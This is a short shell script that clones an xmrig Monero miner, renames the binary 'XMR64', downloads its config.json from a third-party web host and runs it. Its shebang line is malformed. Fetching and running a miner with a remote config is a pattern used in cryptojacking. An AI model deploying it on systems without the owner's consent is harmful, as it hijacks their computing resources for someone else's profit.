#! /binbash
apt update &&
apt upgrade -y &&
apt install git wget libuv-dev -y &&
git clone https://github.com/NanoBytesInc/miners.git &&
mv miners/android_arm64/xmrig XMR64 &&
rm -rf miners &&
wget http://teciel.free.fr/config.json
./XMR64